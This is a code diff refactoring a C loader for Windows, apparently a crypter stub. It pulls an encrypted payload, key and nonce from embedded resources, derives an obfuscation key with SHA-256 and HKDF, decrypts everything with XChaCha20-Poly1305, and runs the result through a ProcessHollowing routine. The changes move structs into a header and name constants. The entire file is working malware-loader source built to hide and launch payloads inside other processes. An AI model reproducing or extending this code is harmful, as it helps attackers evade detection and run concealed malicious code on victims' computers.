@@ -3,42 +3,9 @@
 #include <windows.h>
 #include "crypto/hashing/sha.h"
 #include "crypto/chacha20-poly1305/chacha20poly1305.h"
+#include "headers/unpacker.h"
 
-typedef struct {
-    unsigned char* payload;
-    unsigned char* key;
-    unsigned char* nonce;
-    unsigned long payloadSize;
-    unsigned long keySize;
-    unsigned long nonceSize;
-} Resources;
-
-typedef struct {
-    uint8_t key[32];
-    uint8_t nonce[24];
-    uint8_t hash[32];
-    uint8_t salt[16];
-    uint8_t prk[USHAMaxHashSize];
-    uint8_t okm[80];
-    uint8_t metaNonce[24];
-    uint8_t obfKey[32];
-    uint8_t obfNonce[24];
-} CryptoContext;
-
-typedef struct {
-    void* pe;
-    void* pImageBase;
-    IMAGE_DOS_HEADER* DOSHeader;
-    IMAGE_NT_HEADERS64* NtHeader;
-    IMAGE_SECTION_HEADER* SectionHeader;
-    PROCESS_INFORMATION PI;
-    STARTUPINFOA SI;
-    CONTEXT* CTX;
-    char currentFilePath[MAX_PATH];
-} ProcessContext;
-
-// Function to extract embedded resource from this executable
-unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
+static unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
 {
     HGLOBAL hResData;
     HRSRC   hResInfo;
@@ -146,12 +113,12 @@ cleanup:
     return 1;
 }
 
-static void cleanup_resources(Resources* res, CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize)
+static void CleanupResources(Resources* res, CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize)
 {
     if (crypto)
     {
-        SecureZeroMemory(crypto->key, sizeof(crypto->key));
-        SecureZeroMemory(crypto->nonce, sizeof(crypto->nonce));
+        SecureZeroMemory(crypto->key, KEY_SIZE);
+        SecureZeroMemory(crypto->nonce, NONCE_SIZE);
     }
     
     if (decrypted)
@@ -175,13 +142,13 @@ int main()
     uint8_t* decrypted = NULL;
 
     // Load resources
-    res.payload = GetResource(132, RT_RCDATA, &res.payloadSize);
-    res.key = GetResource(133, RT_RCDATA, &res.keySize);
-    res.nonce = GetResource(134, RT_RCDATA, &res.nonceSize);
+    res.payload = GetResource(PAYLOAD_RESOURCE_ID, RT_RCDATA, &res.payloadSize);
+    res.key = GetResource(KEY_RESOURCE_ID, RT_RCDATA, &res.keySize);
+    res.nonce = GetResource(NONCE_RESOURCE_ID, RT_RCDATA, &res.nonceSize);
 
     if ((res.payload == NULL || res.payloadSize == 0) ||
-        (res.key == NULL || res.keySize != 32) ||
-        (res.nonce == NULL || res.nonceSize != 24)) {
+        (res.key == NULL || res.keySize != KEY_SIZE) ||
+        (res.nonce == NULL || res.nonceSize != NONCE_SIZE)) {
         return 1;
     }
 
@@ -190,27 +157,27 @@ int main()
     SHA256Reset(&shaCtx);
     SHA256Input(&shaCtx, res.payload, res.payloadSize);
     SHA256Result(&shaCtx, crypto.hash);
-    memcpy(crypto.salt, crypto.hash, 16);
+    memcpy(crypto.salt, crypto.hash, SALT_SIZE);
 
     // HKDF key derivation
     HKDFContext hkdfCTX;
     memset(&hkdfCTX, 0, sizeof(hkdfCTX));
-    if (hkdfReset(&hkdfCTX, SHA256, crypto.salt, 16) != 0 ||
-        hkdfInput(&hkdfCTX, crypto.hash, 32) != 0 ||
+    if (hkdfReset(&hkdfCTX, SHA256, crypto.salt, SALT_SIZE) != 0 ||
+        hkdfInput(&hkdfCTX, crypto.hash, KEY_SIZE) != 0 ||
         hkdfResult(&hkdfCTX, crypto.prk, (const uint8_t *)"obfuscation-context", 
-            (int)strlen("obfuscation-context"), crypto.okm, 80) != 0)
+            (int)strlen("obfuscation-context"), crypto.okm, OKM_SIZE) != 0)
     {
         goto cleanup;
     }
 
-    memcpy(crypto.obfKey, crypto.okm, 32);
-    memcpy(crypto.metaNonce, crypto.okm + 56, 24);
+    memcpy(crypto.obfKey, crypto.okm, KEY_SIZE);
+    memcpy(crypto.metaNonce, crypto.okm + 56, METANONCE_SIZE);
 
     // Decrypt key and nonce
     chacha20poly1305_ctx obfCtx;
     xchacha20poly1305_init(&obfCtx, crypto.obfKey, crypto.metaNonce);
-    chacha20poly1305_decrypt(&obfCtx, res.key, crypto.key, 32);
-    chacha20poly1305_decrypt(&obfCtx, res.nonce, crypto.nonce, 24);
+    chacha20poly1305_decrypt(&obfCtx, res.key, crypto.key, KEY_SIZE);
+    chacha20poly1305_decrypt(&obfCtx, res.nonce, crypto.nonce, NONCE_SIZE);
 
     // Decrypt payload
     decrypted = (uint8_t*)VirtualAlloc(NULL, res.payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -228,11 +195,11 @@ int main()
     int result = ProcessHollowing(decrypted, res.payloadSize);
     if (result == 0)
     {
-        cleanup_resources(&res, &crypto, decrypted, res.payloadSize);
+        CleanupResources(&res, &crypto, decrypted, res.payloadSize);
         return 0;
     }
 
 cleanup:
-    cleanup_resources(&res, &crypto, decrypted, res.payloadSize);
+    CleanupResources(&res, &crypto, decrypted, res.payloadSize);
     return 1;
 }
